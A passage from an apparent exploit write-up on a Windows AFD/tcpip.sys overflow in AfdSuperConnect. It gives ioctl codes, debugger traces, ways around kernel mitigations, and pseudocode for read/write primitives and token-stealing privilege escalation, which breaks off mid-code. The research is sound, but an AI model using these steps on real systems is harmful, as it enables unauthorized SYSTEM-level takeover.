&lt;pre tabindex="0">&lt;code>00 nt!NtCreateFile &amp;lt;-- Kernel space function
01 nt!KiSystemServiceCopyEnd+0x25
02 ntdll!NtCreateFile+0x14 &amp;lt;-- User space function
03 mswsock!SockSocket+0x4ec
04 mswsock!WSPSocket+0x233
05 WS2_32!WSASocketW+0x1be
06 WS2_32!socket+0x9b
&lt;/code>&lt;/pre>&lt;p>Note that the address space is still the same, as in user space. The difference being that we are now allowed
to access kernel memory. The arguments to &lt;code>nt!NtCreateFile&lt;/code> are unchanged from the arguments &lt;code>ntdll!NtCreateFile&lt;/code>
received. The kernel very carefully validates all arguments and copies them safely to kernel space memory.&lt;/p>
&lt;p>In this case &amp;ldquo;mswsock.dll&amp;rdquo; tries to open a &lt;code>HANDLE&lt;/code> to AFD or the &amp;ldquo;Ancillary Function Driver for WinSock&amp;rdquo;.&lt;/p>
&lt;h2 id="afd">AFD&lt;/h2>
&lt;p>AFD is located at &amp;ldquo;C:\windows\system32\drivers\afd.sys&amp;rdquo; and provides implementations for the usual socket functions.&lt;/p>
&lt;p>As I have hopefully been able to convince you the &lt;code>socket&lt;/code> function corresponds to opening a &lt;code>HANDLE&lt;/code> to AFD using &lt;code>NtCreateFile&lt;/code>.
Using the &lt;code>HANDLE&lt;/code> returned by &lt;code>NtCreateFile&lt;/code>, communication occurs via the &lt;code>NtDeviceIoControlFile&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">__kernel_entry NTSTATUS &lt;span style="color:#a6e22e">NtDeviceIoControlFile&lt;/span>(
[in] HANDLE FileHandle,
[in] HANDLE Event,
[in] PIO_APC_ROUTINE ApcRoutine,
[in] PVOID ApcContext,
[out] PIO_STATUS_BLOCK IoStatusBlock,
[in] ULONG IoControlCode,
[in] PVOID InputBuffer,
[in] ULONG InputBufferLength,
[out] PVOID OutputBuffer,
[in] ULONG OutputBufferLength
);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, each different socket function corresponds to an &lt;code>IoControlCode&lt;/code> or ioctl for short.
For example, if we &lt;code>bind&lt;/code> the socket we end up in &lt;code>afd!AfdBind&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>00 afd!AfdBind
01 afd!AfdDispatchDeviceControl+0x7d
02 nt!IofCallDriver+0x59
03 nt!IopSynchronousServiceTail+0x1b1
04 nt!IopXxxControlFile+0xe0c
05 nt!NtDeviceIoControlFile+0x56
06 nt!KiSystemServiceCopyEnd+0x25
07 ntdll!NtDeviceIoControlFile+0x14
08 mswsock!WSPBind+0x278
09 WS2_32!bind+0xdf
0a blog_socket!main+0x137
&lt;/code>&lt;/pre>&lt;p>Similarly, &lt;code>recv&lt;/code> corresponds to &lt;code>AfdReceive&lt;/code>, &lt;code>send&lt;/code> corresponds to &lt;code>AfdSend&lt;/code> and so on.
The arguments and return values of these functions are serialized into the &lt;code>InputBuffer&lt;/code> and &lt;code>OutputBuffer&lt;/code>, respectively.&lt;/p>
&lt;h2 id="the-bug">The Bug&lt;/h2>
&lt;p>The bug combines three different features that Windows 10 provides. The &lt;code>TCP_FASTOPEN&lt;/code> option, the &lt;code>ConnectEx&lt;/code>/&lt;code>AfdSuperConnect&lt;/code> function and the &lt;code>AF_UNIX&lt;/code> address family.&lt;/p>
&lt;h3 id="tcp_fastopen">TCP_FASTOPEN&lt;/h3>
&lt;p>Taken from &lt;a href="https://en.wikipedia.org/wiki/TCP_Fast_Open">Wikipedia&lt;/a>, the &lt;code>TCP_FASTOPEN&lt;/code> option allows the client under certain conditions to start sending data to the host without waiting for the &lt;code>ACK&lt;/code> packet. For us, what it does is not important, only that it is necessary to call &lt;code>AfdSuperConnect&lt;/code> later on.&lt;/p>
&lt;h3 id="af_unix">AF_UNIX&lt;/h3>
&lt;p>As mentioned by this blog, the vulnerability probably turned exploitable when Windows &lt;a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/">started supporting&lt;/a> sockets of type &lt;code>AF_UNIX&lt;/code>.
&lt;code>AF_UNIX&lt;/code> sockets provide a means of inter-process communication. For us the important fact is that the associated &lt;code>sockaddr&lt;/code> looks like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define UNIX_PATH_MAX 108
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> sockaddr_un
{
ADDRESS_FAMILY sun_family; &lt;span style="color:#75715e">/* AF_UNIX */&lt;/span>
&lt;span style="color:#66d9ef">char&lt;/span> sun_path[UNIX_PATH_MAX]; &lt;span style="color:#75715e">/* pathname */&lt;/span>
} SOCKADDR_UN, &lt;span style="color:#f92672">*&lt;/span>PSOCKADDR_UN;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And therefore, with a size of &lt;code>110 = 0x6e&lt;/code> is quite large.&lt;/p>
&lt;h3 id="connectex">ConnectEx&lt;/h3>
&lt;p>The &lt;code>ConnectEx&lt;/code> function is a &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/mswsock/nc-mswsock-lpfn_connectex">Microsoft specific extension&lt;/a>, which can be queried using &lt;code>WSAIoctl&lt;/code>.
The underlying kernel function is &lt;code>AfdSuperConnect&lt;/code>.
Sadly, the user space API validates the arguments to &lt;code>ConnectEx&lt;/code> and therefore we are forced to call it using &lt;code>NtDeviceIoControlFile&lt;/code> directly.
The socket functions do not expose the underlying handles to AFD. This forces us to use &lt;code>NtCreateFile&lt;/code> and &lt;code>NtDeviceIoControlFile&lt;/code> directly for all communication with AFD.&lt;/p>
&lt;p>&lt;code>AfdSuperConnect&lt;/code> gets invoked when using &lt;code>NtDeviceIoControlFile&lt;/code> with the ioctl &lt;code>0x120c7&lt;/code>.
The input buffer for this call consists of 10 bytes, most of which seem to be unused and then any &lt;code>sockaddr&lt;/code>.
The vulnerability occurs when &lt;code>AfdSuperConnect&lt;/code> attempts to connect to a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_UNIX&lt;/code>.&lt;/p>
&lt;h3 id="the-setup">The Setup&lt;/h3>
&lt;ol>
&lt;li>Create an &lt;code>AF_INET&lt;/code> socket using &lt;code>NtCreateFile&lt;/code>.&lt;/li>
&lt;li>Enable the &lt;code>TCP_FASTOPEN&lt;/code> option using &lt;code>AfdTliIoControl&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x120bf&lt;/code>).&lt;/li>
&lt;li>Bind the socket to any address using ioctl &lt;code>AfdBind&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x12003&lt;/code>).&lt;/li>
&lt;li>Trigger the vulnerability by using &lt;code>AfdSuperConnect&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x120c7&lt;/code>) passing a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_UNIX&lt;/code>.&lt;/li>
&lt;/ol>
&lt;p>As we opened the socket as an &lt;code>AF_INET&lt;/code> socket, the call to &lt;code>AfdSuperConnect&lt;/code> ends up in &lt;code>tcpip!TcpTlProviderConnectAndSend&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>00 tcpip!TcpTlProviderConnectAndSend
01 afd!AfdSuperConnect+0x10b26
02 afd!AfdDispatchDeviceControl+0x7d
03 nt!IofCallDriver+0x59
04 nt!IopSynchronousServiceTail+0x1b1
05 nt!IopXxxControlFile+0xe0c
06 nt!NtDeviceIoControlFile+0x56
&lt;/code>&lt;/pre>&lt;p>&lt;code>tcpip!TcpCreateConnectTcb&lt;/code> checks early on whether the &lt;code>TCP_FASTOPEN&lt;/code> option is enabled and if it is not it returns with the error code &lt;code>STATUS_RETRY&lt;/code>.
If it is, it allocates a big internal structure and later on copies the &lt;code>sockaddr&lt;/code> we provided into the internal structure.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Ghidra Decompilation from (tcpip!TcpCreateConnectTcb)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
SockaddrFamily &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>TlConnect&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ConnectSockaddr;
&lt;span style="color:#66d9ef">if&lt;/span> (SockaddrFamily &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x23&lt;/span>) {
sockaddr_size &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">&amp;amp;::&lt;/span>sockaddr_size)[SockaddrFamily];
}
&lt;span style="color:#75715e">/* this is where the magic happens */&lt;/span>
memcpy(&lt;span style="color:#f92672">&amp;amp;&lt;/span>_Dst&lt;span style="color:#f92672">-&amp;gt;&lt;/span>contains_the_function_pointer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sockaddr,
TlConnect&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ConnectSockaddr, sockaddr_size);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Crucially, as this is all happening in &amp;ldquo;tcpip.sys&amp;rdquo;, the code only expects a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_INET&lt;/code> or &lt;code>AF_INET6&lt;/code> which are of size &lt;code>0x1c&lt;/code> and &lt;code>0x24&lt;/code>, respectively.
Hence, tcpip only reserves &lt;code>0x24&lt;/code> bytes of memory for said &lt;code>sockaddr&lt;/code> and we can overwrite &lt;code>0x6e - 0x24&lt;/code> bytes after the size reserved for the &lt;code>sockaddr&lt;/code>.
Fortunately for us, this range of bytes contains a callback function pointer (originally pointing to &lt;code>afd!AfdTLBufferedSendComplete&lt;/code>) and its callback context argument.&lt;/p>
&lt;p>Prior to the vulnerable &lt;code>memcpy&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dq rax + f8 L2
ffffac8e`6702a138 fffff806`2d0db540 ffffac8e`6841c9e0
kd&amp;gt; ln fffff806`2d0db540
(fffff806`2d0db540) afd!AfdTLBufferedSendComplete
&lt;/code>&lt;/pre>&lt;p>After the vulnerable &lt;code>memcpy&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dq ffffac8e`6702a138 L2
ffffac8e`6702a138 13371337`13371337 deaddead`deaddead
&lt;/code>&lt;/pre>&lt;p>The call to &lt;code>tcpip!TcpTlProviderConnectAndSend&lt;/code> eventually fails, returning a status code of &lt;code>STATUS_INVALID_ADDRESS_COMPONENT&lt;/code>,
but not before trying to &amp;ldquo;complete&amp;rdquo; the request, by calling the callback function pointer, passing its callback context as the first argument.&lt;/p>
&lt;pre tabindex="0">&lt;code>Breakpoint 3 hit
tcpip!guard_dispatch_icall_nop:
fffff803`11e36490 ffe0 jmp rax
kd&amp;gt; r rax, rcx
rax=1337133713371337 rcx=deaddeaddeaddead
kd&amp;gt; k
# Child-SP RetAddr Call Site
00 ffffeb0f`32dc18e8 fffff803`11d767fd tcpip!guard_dispatch_icall_nop
01 ffffeb0f`32dc18f0 fffff803`11d73840 tcpip!TcpCreateAndConnectTcbComplete+0xc39
02 ffffeb0f`32dc1b30 fffff803`11d88e2a tcpip!TcpShutdownTcb+0x1040
03 ffffeb0f`32dc1f20 fffff803`11d88d38 tcpip!TcpCreateAndConnectTcbInspectConnectComplete+0xba
04 ffffeb0f`32dc2000 fffff803`11d87be8 tcpip!TcpContinueCreateAndConnect+0x1044
05 ffffeb0f`32dc2220 fffff803`11d87998 tcpip!TcpCreateAndConnectTcbInspectConnectRequestComplete+0x118
06 ffffeb0f`32dc2330 fffff803`11d8709d tcpip!TcpCreateAndConnectTcbWorkQueueRoutine+0x8a8
07 ffffeb0f`32dc2450 fffff803`11ea2247 tcpip!TcpCreateAndConnectTcb+0xcb5
08 ffffeb0f`32dc25d0 fffff803`11995606 tcpip!TcpTlProviderConnectAndSend+0x17
09 ffffeb0f`32dc2600 fffff803`1198958d afd!AfdSuperConnect+0x10b26
&lt;/code>&lt;/pre>&lt;h2 id="exploitability-mitigations-and-complications">Exploitability, Mitigations and Complications&lt;/h2>
&lt;p>As we have seen, the vulnerability gives us full control of the instruction pointer &lt;code>rip&lt;/code> and the first argument &lt;code>rcx&lt;/code>, and does so by calling into a function pointer we can freely choose.
A vulnerability this good is almost always exploitable. But we first have to jump through some loops&amp;hellip;&lt;/p>
&lt;h3 id="smep-supervisor-mode-execution-prevention">SMEP (Supervisor Mode Execution Prevention)&lt;/h3>
&lt;p>The simplest idea to exploit a bug of this kind would be to set the instruction pointer to a user space address,
i.e write some shellcode that when executed in kernel mode will elevate permissions of the current process.
Sadly, Intel thought of this long ago and introduced SMEP.
SMEP uses the fact that user-pages have the &lt;code>USER&lt;/code> flag set in the page tables to throw an exception
when the kernel executes any user address.&lt;/p>
&lt;h3 id="aslr-address-space-layout-randomization">ASLR (Address Space Layout Randomization)&lt;/h3>
&lt;p>Okay, so just executing user space code is out of the question, but what if we first load our shellcode into the kernel? First of, though it sounds hard,
it is actually really easy to allocate arbitrary rwx-memory into kernel space using pipes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">char&lt;/span> rwx_memory [&lt;span style="color:#ae81ff">0x100&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#f92672">&amp;lt;&lt;/span>my_shellcode&lt;span style="color:#f92672">&amp;gt;&lt;/span> }; &lt;span style="color:#75715e">// cannot contain zeroes
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
HANDLE read_pipe;
HANDLE write_pipe;
CreatePipe (&lt;span style="color:#f92672">&amp;amp;&lt;/span>read_pipe, &lt;span style="color:#f92672">&amp;amp;&lt;/span>write_pipe, NULL, NULL);
&lt;span style="color:#75715e">// ends up in &amp;#39;NpSetAttribute&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtFsControlFile(write_pipe, NULL, NULL, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>status, &lt;span style="color:#ae81ff">0x11003C&lt;/span>,
rwx_memory, &lt;span style="color:#66d9ef">sizeof&lt;/span>(rwx_memory), output, &lt;span style="color:#66d9ef">sizeof&lt;/span>(output));
&lt;/code>&lt;/pre>&lt;/div>&lt;p>But as far as I know, there is no way for us to know where this allocation will end up (without another exploit or administrator privileges which would defeat the purpose).
Even if we could control the heap perfectly we do not know where the heap starts.
This is because of ASLR (Address Space Layout Randomization). At system startup, Windows randomizes all addresses it will use during runtime.&lt;/p>
&lt;p>So&amp;hellip;? Can we somehow get or leak addresses (or pointers) from the kernel? Fortunately, Windows is very nice to us in this respect.
There is a user space function called &lt;code>NtQuerySystemInformation&lt;/code>, which can be used to retrieve a lot of different kinds of information depending on an &lt;code>InformationClass&lt;/code>.
The &lt;code>InformationClass&lt;/code> we are interested in is &lt;code>SystemModuleInformation&lt;/code>. Using it, we can obtain the loaded base address of every currently running driver on the system,
including the kernel (ntoskrnl.exe) itself.&lt;/p>
&lt;p>By parsing the images contained on disk and using these base addresses, we know the address of every exported kernel function.
One could go one step further and look at all symbols using the public symbols (.pdb) provided by Microsoft,
but for our purposes restricting the search to exported functions was enough.&lt;/p>
&lt;h3 id="cfg-control-flow-guards">CFG (Control Flow Guards)&lt;/h3>
&lt;p>Okay, the plan is to call exported kernel functions, but there (potentially) is one more obstacle in our way the CFG (Control Flow Guard) mitigation.
I did not emphasize this above, but looking at the call stack to the vulnerable call we can see that we are inside of a function called &lt;code>guard_dispatch_icall_nop&lt;/code>.
This means that control flow guards are disabled. If they were enabled we would instead be inside &lt;code>nt!guard_dispatch_icall&lt;/code>.
&lt;code>nt!guard_dispatch_icall&lt;/code> checks whether the address we are jumping to is registered as a CFG target. If the target is not registered, &lt;code>nt!guard_dispatch_icall&lt;/code> crashes the system (mitigating the exploit).
This registration happens when the driver is loaded. The binary contains information on which functions are valid CFG targets.&lt;/p>
&lt;p>You can also view the CFG information using dumpbin:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt; dumpbin /loadconfig C:\windows\system32\ntoskrnl.exe
Microsoft (R) COFF/PE Dumper Version 14.28.29336.0
Copyright (C) Microsoft Corporation. All rights reserved.
Dump of file C:\windows\system32\ntoskrnl.exe
File Type: EXECUTABLE IMAGE
Section contains the following load config:
&amp;lt;...&amp;gt;
Guard CF Function Table
Address
--------
0000000140200010
E 0000000140200050
00000001402000B0
00000001402001A0
E 0000000140200580
E 0000000140200940
E 00000001402009F0
0000000140200C40
00000001402010B0
00000001402010E0
0000000140201200
E 0000000140201750
E 0000000140201770
.
.
.
&lt;/code>&lt;/pre>&lt;p>Therefore, if the exploit is supposed to work even if CFG is enabled, we need to chose our target function as a valid CFG target.&lt;/p>
&lt;h3 id="irql-interrupt-request-level">IRQL (Interrupt Request Level)&lt;/h3>
&lt;p>One last detail that bears mentioning, is the Interrupt Request Level (IRQL). The interrupt Request level is a hardware feature that allows threads to specify what interrupts they are willing to accept.
Importantly, if the IRQL is at &amp;gt;= 2 the thread is not allowed to page-fault anymore. This means that when the IRQL is at least two, the thread cannot access pageable memory anymore.&lt;/p>
&lt;p>Pageable memory is memory that the Windows kernel reserves the right to spill to disk, if the system is running low on memory. If a thread would then access that memory a pagefault would occur and the Windows kernel
would reload the page from disk.&lt;/p>
&lt;p>Why is all this important? Well, it just so happens that the function we are overwriting is a &amp;ldquo;Completion Routine&amp;rdquo;.
Completion Routines are supposed to run at IRQL = 2 and therefore might crash the system whenever they are accessing paged memory.
All user space memory is paged and thus the exploit might crash when accessing user space memory.
Further, not all kernel space functions are non-paged (though most are), further restricting the set of functions we can use in the exploit.&lt;/p>
&lt;p>In reality, we are only interested in providing a proof of concept, so one could just ignore the the fact that the exploit crashes sometimes, but we actually have a solution:&lt;/p>
&lt;p>Sometimes, when the kernel uses a piece of user space memory, it uses so called &lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls">Memory Descriptor Lists (MDL)&lt;/a>. When such a list is &amp;ldquo;locked&amp;rdquo;, the kernel will never page out the memory.
Therefore, we just have to make some request, that will &amp;ldquo;lock&amp;rdquo; an MDL for the user space memory we are using and then we can reliably use it at IRQL = 2.&lt;/p>
&lt;h2 id="primitives">Primitives&lt;/h2>
&lt;p>So, we have control over &lt;code>rip&lt;/code> and &lt;code>rcx&lt;/code> and can call some exported kernel functions, but what is the plan?
Roughly, we want to obtain exploit primitives which allow us to read and write kernel memory:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">u64 &lt;span style="color:#a6e22e">read_u64&lt;/span>(u64 kernel_address);
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_u64&lt;/span>(u64 kernel_address, u64 value);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>These will later be used to give our process administrator privileges using a generalized exploit algorithm.&lt;/p>
&lt;p>We construct these primitives by using the vulnerability with an exported kernel function.
The perfect kernel function for a read primitive would look something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> read_argument &lt;span style="color:#f92672">*&lt;/span>read){
read&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> read&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pointer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And the perfect write function would look something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> write_argument &lt;span style="color:#f92672">*&lt;/span>write){
&lt;span style="color:#f92672">*&lt;/span>write&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pointer &lt;span style="color:#f92672">=&lt;/span> write&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here the read/write argument would be a pointer to user space memory. This means we have full control of the value of &lt;code>read-&amp;gt;pointer&lt;/code> and &lt;code>write-&amp;gt;pointer&lt;/code>, respectively.
These pointers then get dereferenced and either written to the controlled &lt;code>write-&amp;gt;value&lt;/code> or read and stored back into user space memory.&lt;/p>
&lt;p>If one cannot find primitives as perfect as these, one can search for functions that &lt;em>spread&lt;/em> the first argument.
The perfect spread function would be something like:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">spread_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> arguments &lt;span style="color:#f92672">*&lt;/span>arguments){
(&lt;span style="color:#f92672">*&lt;/span>arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>function)(arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_1, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_2,
arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_3, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_4);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using the perfect spread function one could obtain a read/write function as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_write_function_called_by_spread_function&lt;/span>(
&lt;span style="color:#66d9ef">struct&lt;/span> argument_1 &lt;span style="color:#f92672">*&lt;/span>arg_1, &lt;span style="color:#66d9ef">struct&lt;/span> argument_2 &lt;span style="color:#f92672">*&lt;/span>arg_2){
arg_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> arg_2&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In practice, we used two spread functions and then different read and write functions.&lt;/p>
&lt;h2 id="windows-exploitation-tricks-and-the-general-exploit-algorithm">Windows Exploitation tricks and the general exploit algorithm&lt;/h2>
&lt;p>The exploitation algorithm we are using is called &amp;ldquo;Token Stealing&amp;rdquo;. You can find a lot of information on it online. But we will give a short overview.&lt;/p>
&lt;p>Every process has an internal &lt;code>_EPROCESS&lt;/code> kernel structure. The access rights of the process are contained in an internal kernel structure called &lt;code>_TOKEN&lt;/code>.
The &lt;code>_EPROCESS&lt;/code> structure references this token, by pointer.&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dt nt!_EPROCESS Token
+0x358 Token : _EX_FAST_REF
kd&amp;gt; nt!_EX_FAST_REF
+0x000 Object : Ptr64 Void
+0x000 RefCnt : Pos 0, 4 Bits
+0x000 Value : Uint8B
&lt;/code>&lt;/pre>&lt;p>Now, if we control the &lt;code>_TOKEN&lt;/code>, we have control of all access rights.
One option would be to use the read and write primitive to directly alter the access token, but in this case there is a simpler way.
If we can locate a process which has &lt;code>SYSTEM&lt;/code> access rights, we can simply copy the &lt;code>_TOKEN&lt;/code>-pointer of the &lt;code>SYSTEM&lt;/code> process into the &lt;code>_EPROCESS-&amp;gt;Token&lt;/code> of our process.
And it just so happens that the kernel exports a pointer to the &lt;code>nt!PsInitialSystemProcess&lt;/code> which has &lt;code>SYSTEM&lt;/code> access rights.&lt;/p>
&lt;p>Therefore, the basic algorithm would be&lt;/p>
&lt;ol>
&lt;li>Use the read primitive to read the value of &lt;code>(nt!PsInitialSystemProcess)-&amp;gt;Token&lt;/code>&lt;/li>
&lt;li>Use the write primitive to write the value to our &lt;code>_EPROCESS-&amp;gt;Token&lt;/code> field.&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://lolcads.github.io/2022/06/token_stealing.svg" alt="Token Stealing">&lt;/p>
&lt;p>But 2 problems remain:&lt;/p>
&lt;ol>
&lt;li>As the &lt;code>_EPROCESS&lt;/code> structure is undocumented and subject to change, the offset of the &lt;code>Token&lt;/code> field varies by kernel version.&lt;/li>
&lt;li>We do not know where our &lt;code>_EPROCESS&lt;/code> structure is.&lt;/li>
&lt;/ol>
&lt;p>This is where Windows is really helpful again. Just as we can find all base addresses of kernel modules using &lt;code>NtQuerySystemInformation(SystemModuleInformation)&lt;/code>,
we can find the address of both our &lt;code>_EPROCESS&lt;/code> structure (solving 2) and our &lt;code>_TOKEN&lt;/code> structure using &lt;code>NtQuerySystemInformation(SystemHandleInformation)&lt;/code>.
Now, using the read primitive, we can iterate through our &lt;code>_EPROCESS&lt;/code> structure and locate the &lt;code>_TOKEN&lt;/code> structure.
This then gives us the offset of the &lt;code>Token&lt;/code> field.&lt;/p>
&lt;p>Putting it all together in pseudo-code, it looks something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Use the Windows API to get all the information we want.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>token, process :&lt;span style="color:#f92672">=&lt;/span> find_token_and_process_using_NtQuerySystemInformation();
PsInitialSystemProcess_export, read_function, write_function :&lt;span style="color:#f92672">=&lt;/span>
find_exported_symbols_using_NtQuerySystemInformation();
&lt;span style="color:#75715e">// Use a system call that is more or less equivalent to
&lt;/span>&lt;span style="color:#75715e">// `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>socket_handle :&lt;span style="color:#f92672">=&lt;/span> NtCreateFile(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Device&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Afd&amp;#34;&lt;/span>, EaBuffer &lt;span style="color:#f92672">=&lt;/span> {AF_INET, SOCK_STREAM, IPPROTO_TCP});
&lt;span style="color:#75715e">// use the system call that is equivalent to
&lt;/span>&lt;span style="color:#75715e">// `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, &amp;amp;(u32){1}, 1)`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120bf&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {SetSockOpt, .level &lt;span style="color:#f92672">=&lt;/span> IPPROTO_TCP, .option &lt;span style="color:#f92672">=&lt;/span> TCP_FASTOPEN, .optval &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>(u32){&lt;span style="color:#ae81ff">1&lt;/span>}, .optlen &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>});
&lt;span style="color:#75715e">// use the system call that is equivalent to
&lt;/span>&lt;span style="color:#75715e">// `bind(socket, &amp;amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x12003&lt;/span>, ...);
&lt;span style="color:#75715e">// The read and write primitives now work by triggering the vulnerability by calling
&lt;/span>&lt;span style="color:#75715e">// `AfdSuperConnect` through the `NtDeviceIoControlFile`.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>function u64 &lt;span style="color:#a6e22e">read_u64&lt;/span>(u64 address)&lt;span style="color:#f92672">:&lt;/span>
read_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address};
NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> read_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>read_argument}});
&lt;span style="color:#66d9ef">return&lt;/span> read_argument.value;
function &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_u64&lt;/span>(u64 address, u64 value)&lt;span style="color:#f92672">:&lt;/span>
write_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address, .value &lt;span style="color:#f92672">=&lt;/span> value};
